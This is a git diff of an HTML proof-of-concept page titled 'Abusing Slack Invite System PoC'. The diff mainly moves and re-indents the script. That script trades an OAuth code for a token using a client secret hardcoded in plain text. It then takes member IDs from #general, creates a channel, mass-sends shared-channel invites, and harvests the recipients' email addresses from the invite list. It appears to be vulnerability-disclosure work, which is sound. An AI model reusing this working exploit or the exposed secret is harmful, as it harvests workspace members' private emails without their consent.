@@ -10,20 +10,8 @@
 
     <!-- Latest compiled and minified JavaScript -->
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-    <script>
-        function getObject(){
-    if(localStorage.getItem("token") == "" || localStorage.getItem("token") == "undefined" || !localStorage.getItem("token")){
-        fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
-            response => response.json()
-        ).then((json) => {
-            console.log(json);
-            localStorage.setItem("token", json["access_token"])
-        });
-    
-}
-    </script>
 </head>
-<body onload="getObject()">
+<body onload="getObject();">
     <div class="container pt-3">
         <h1>Abusing Slack Invite System PoC</h1>
         <p>The app uses bot permissions and can fetch email addresses of workspace members without proper oauth permissions</p>
@@ -35,60 +23,71 @@
         <h3><br />Preview:-</h3><hr />
         <pre class="preview"></pre>
     </div>
-    </body>
-<script>
+    <script>
 
 
-var secret = "25fddec3d9e5e457230f7ce6fdeb2412";
-var id = "1021671975639.1033839615009";
-
-//const params = new URLSearchParams(document.location.href);
-var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
-var data = "code="+code+"&client_id="+id+"&client_secret="+secret;
-
-function fetchEmails(){
-    var token = localStorage.getItem("token");
-    var count = localStorage.getItem("memberscount");
-    fetch("https://slack.com/api/conversations.listConnectInvites?&token="+token).then(
-            response => response.json()).then((json) => {
-            for(var i=json["invites"].length - 1; i > (json["invites"].length - count); i--)
-                document.getElementsByClassName("preview")[0].innerHTML += json["invites"][i]["invite"]["recipient_email"]+"<br />";
-        })
-}
-
-function inviteUsers(members, channelId){
-    var token = localStorage.getItem("token");
-    document.getElementsByClassName("preview")[0].innerHTML += "[+] Inviting members to the channel<br />";
-    for(var i=0; i < members.length; i++){
-        fetch("https://slack.com/api/conversations.inviteShared?&channel="+channelId+"&user_ids="+members[i]+"&token="+token).then(
-            response => response.json()).then((json) => {
-            //inviteUsers(members,json["channel"]["id"])
-        })
-    }
-}
-
-function createNewConversation(members){
-    var randomNumber = Math.round(Math.random() * 100);
-    var channelName = "bot"+randomNumber;
-    var token = localStorage.getItem("token");
-    fetch("https://slack.com/api/conversations.create?&name="+channelName+"&token="+token).then(
-        response => response.json()).then((json) => {
-            document.getElementsByClassName("preview")[0].innerHTML += "[+] Creating new channel "+channelName+"<br />";
-            inviteUsers(members,json["channel"]["id"])
-    })
-
-}
-
-function startPoC() {
-    var token = localStorage.getItem("token");
-    fetch("https://slack.com/api/conversations.members?&channel=CUQNLNEN4&token="+token).then(
-        response => response.json()).then((json) => {
-            localStorage.setItem("memberscount", json["members"].length)
-            document.getElementsByClassName("preview")[0].innerHTML = "[+] Fetching member ids from #general<br />";
-            createNewConversation(json["members"])
-        });
-}
-
-</script>
-
+        var secret = "25fddec3d9e5e457230f7ce6fdeb2412";
+        var id = "1021671975639.1033839615009";
+        
+        //const params = new URLSearchParams(document.location.href);
+        var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
+        var data = "code="+code+"&client_id="+id+"&client_secret="+secret;
+        
+        function fetchEmails(){
+            var token = localStorage.getItem("token");
+            var count = localStorage.getItem("memberscount");
+            fetch("https://slack.com/api/conversations.listConnectInvites?&token="+token).then(
+                    response => response.json()).then((json) => {
+                    for(var i=json["invites"].length - 1; i > (json["invites"].length - count); i--)
+                        document.getElementsByClassName("preview")[0].innerHTML += json["invites"][i]["invite"]["recipient_email"]+"<br />";
+                })
+        }
+        
+        function inviteUsers(members, channelId){
+            var token = localStorage.getItem("token");
+            document.getElementsByClassName("preview")[0].innerHTML += "[+] Inviting members to the channel<br />";
+            for(var i=0; i < members.length; i++){
+                fetch("https://slack.com/api/conversations.inviteShared?&channel="+channelId+"&user_ids="+members[i]+"&token="+token).then(
+                    response => response.json()).then((json) => {
+                    //inviteUsers(members,json["channel"]["id"])
+                })
+            }
+        }
+        
+        function createNewConversation(members){
+            var randomNumber = Math.round(Math.random() * 100);
+            var channelName = "bot"+randomNumber;
+            var token = localStorage.getItem("token");
+            fetch("https://slack.com/api/conversations.create?&name="+channelName+"&token="+token).then(
+                response => response.json()).then((json) => {
+                    document.getElementsByClassName("preview")[0].innerHTML += "[+] Creating new channel "+channelName+"<br />";
+                    inviteUsers(members,json["channel"]["id"])
+            })
+        
+        }
+        
+        function startPoC() {
+            var token = localStorage.getItem("token");
+            fetch("https://slack.com/api/conversations.members?&channel=CUQNLNEN4&token="+token).then(
+                response => response.json()).then((json) => {
+                    localStorage.setItem("memberscount", json["members"].length)
+                    document.getElementsByClassName("preview")[0].innerHTML = "[+] Fetching member ids from #general<br />";
+                    createNewConversation(json["members"])
+                })
+        }
+        
+        function getObject(){
+            if(localStorage.getItem("token") == "" || localStorage.getItem("token") == "undefined" || !localStorage.getItem("token")){
+                fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
+                    response => response.json()
+                ).then((json) => {
+                    console.log(json);
+                    localStorage.setItem("token", json["access_token"])
+                });
+            
+        }}
+        
+        
+        </script>
+</body>
 </html>
